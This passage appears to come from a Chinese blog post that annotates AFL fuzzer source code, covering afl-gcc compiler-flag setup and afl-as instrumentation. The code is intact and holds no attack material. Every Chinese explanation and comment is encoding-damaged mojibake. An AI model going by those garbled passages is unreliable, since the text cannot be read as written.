class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é¦–å…ˆå°†è®¾ç½®æŒ‡å®šçš„ç¼–è¯‘å™¨</span></span><br><span class="line">  <span class="comment">// å¦‚æœæ˜¯afl-clangï¼Œè®¾ç½®ç¼–è¯‘å™¨ä¸º clang</span></span><br><span class="line">  <span class="comment">// alf-clang++åŒç†</span></span><br><span class="line">  <span class="comment">// more: afl-clang-faståœ¨ llvm mode å¤„ç†</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;    <span class="comment">// else å°±æ˜¯ afl-gcc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç¬¬äºŒä¸ªå‚æ•°ï¼Œè®¾ç½®ä¸€äº›ç¼–è¯‘å™¨å‚æ•°</span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// -B ï¼ŒæŒ‡å®šæ±‡ç¼–å™¨çš„ç›®å½•ï¼Œä¼šè¢«è¦†ç›–ä¸º as_path</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clang mode çš„ä¸€äº›flag</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_HARDEN å¼€å¯æ ˆä¿æŠ¤ï¼Œæ›´å®¹æ˜“å‘ç°æ ˆæº¢å‡ºé—®é¢˜</span></span><br><span class="line">  <span class="comment">// å¼€å¯stack canary</span></span><br><span class="line">  <span class="comment">// æ£€æµ‹å›ºå®šçš„å‡½æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ£€æµ‹å†…å­˜é—®é¢˜</span></span><br><span class="line">  <span class="comment">// ASan æ˜¯ç”¨æ¥æ£€æµ‹ é‡Šæ”¾åä½¿ç”¨(use-after-free)ã€å¤šæ¬¡é‡Šæ”¾(double-free)</span></span><br><span class="line">  <span class="comment">// ç¼“å†²åŒºæº¢å‡º(buffer overflows)å’Œä¸‹æº¢(underflows) çš„å†…å­˜é—®é¢˜ã€‚</span></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_DONT_OPTIMIZEï¼šç¼–è¯‘å™¨ä¼˜åŒ–å¼€å…³</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¸ä½¿ç”¨æŸäº›å†…ç½®å‡½æ•°</span></span><br><span class="line">  <span class="comment">// æ¯”å¦‚ç¼–å†™æŸäº›æ“ä½œç³»ç»Ÿæ—¶å°±ä¸ä½¿ç”¨å†…ç½®å‡½æ•°</span></span><br><span class="line">  <span class="comment">// -fno-builtin</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å®Œå‚æ•°åï¼Œgccå¼€å§‹ç¼–è¯‘ã€‚ä¸€ä¸ªcæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶åˆ†ä¸º <code>é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–ï¼Œé“¾æ¥</code>é˜¶æ®µ</p>
<h2 id="afl-as-é™æ€æ’æ¡©"><a href="#afl-as-é™æ€æ’æ¡©" class="headerlink" title="afl-as é™æ€æ’æ¡©"></a>afl-as é™æ€æ’æ¡©</h2><p>-B çš„å«ä¹‰ï¼š Add &lt;directory&gt; to the compilerâ€™s search pathsï¼Œä¹Ÿå°±æ˜¯åœ¨æ­¤ç›®å½•ä¸‹å¯»æ‰¾æ±‡ç¼–å™¨</p>
<p>Cè¯­è¨€ç¼–è¯‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc tmp.c -S tmp.S -O0 -fno-asynchronous-unwind-tables</span><br><span class="line">cc1: warning: tmp.S is shorter than expected</span><br><span class="line"><span class="comment"># 0 &quot;tmp.S&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot; 2</span></span><br><span class="line"><span class="comment"># 1 &quot;tmp.S&quot;</span></span><br><span class="line"> .file <span class="string">&quot;tmp.c&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .section .rodata</span><br><span class="line">.LC0:</span><br><span class="line"> .string <span class="string">&quot;hello&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .globl main</span><br><span class="line"> .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br><span class="line">main:</span><br><span class="line"> pushq %rbp</span><br><span class="line"> movq %rsp, %rbp</span><br><span class="line"> leaq .LC0(%rip), %rax</span><br><span class="line"> movq %rax, %rdi</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> call <span class="built_in">printf</span>@PLT</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> popq %rbp</span><br><span class="line"> ret</span><br><span class="line"> .size main, .-main</span><br><span class="line"> .ident <span class="string">&quot;GCC: (Debian 13.2.0-13) 13.2.0&quot;</span></span><br><span class="line"> .section .note.GNU-stack,<span class="string">&quot;&quot;</span>,@progbits</span><br></pre></td></tr></table></figure>

<p>åœ¨æ±‡ç¼–è¿‡ç¨‹æ’æ¡©ï¼Œå¾—åˆ°ä¸ä¸€æ ·çš„æ±‡ç¼–ä»£ç </p>
<p>afl-clangå’Œafl-gccå­˜åœ¨ä¸€å®šçš„åŒºåˆ«ï¼Œä½†æ˜¯åŸç†ç±»ä¼¼</p>
<ul>
<li>llvm-mode</li>
</ul>
<h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p>afl-asçš„å…¥å£ï¼Œå‡ ä¹å’Œafl-gccå·®ä¸å¤š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  clang_mode = !!<span class="built_in">getenv</span>(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ ¹æ®æ—¶é—´ç”Ÿæˆä¸€ä¸ªéšæœºç§å­</span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">srandom</span>(rand_seed);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¿®æ”¹å‚æ•°</span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(AS_LOOP_ENV_VAR))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setenv</span>(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line">  <span class="comment">// æ£€æŸ¥å†…å­˜é—®é¢˜çš„å‚æ•°</span></span><br><span class="line">  <span class="comment">// åœ¨è¿›è¡ŒASANçš„ç¼–è¯‘æ—¶ï¼ŒAFLæ— æ³•è¯†åˆ«å‡ºASANç‰¹å®šçš„åˆ†æ”¯ï¼Œå¯¼è‡´æ’å…¥å¾ˆå¤šæ— æ„ä¹‰çš„æ¡©ä»£ç ï¼Œæ‰€ä»¥ç›´æ¥æš´åŠ›åœ°å°†æ’æ¡©æ¦‚ç‡/3ï¼›</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ’æ¡©æ ¸å¿ƒä»£ç </span></span><br><span class="line">  <span class="keyword">if</span> (!just_version) <span class="built_in">add_instrumentation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åœ¨å­è¿›ç¨‹è¿›è¡Œæ‰§è¡Œ afl-as</span></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¯ä»¥è®¾ç½®è¿™ä¸ªå‚æ•°é€‰æ‹©æ˜¯å¦åˆ é™¤æ‰.Sæ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="edit-param-1"><a href="#edit-param-1" class="headerlink" title="edit param"></a>edit param</h3><p>è¿˜æ˜¯afl-aså‚æ•°çš„è®¾ç½®ï¼Œè¿™é‡Œå·²ç»è¢« afl-gcc è®¾ç½®è¿‡ä¸€æ¬¡</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä»ç„¶æ˜¯ç¯å¢ƒå˜é‡</span></span><br><span class="line">  u8 *tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// è·å¾—ä¸€ä¸ª tmp ç›®å½•ï¼Œç”Ÿæˆä¸­é—´æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">32</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 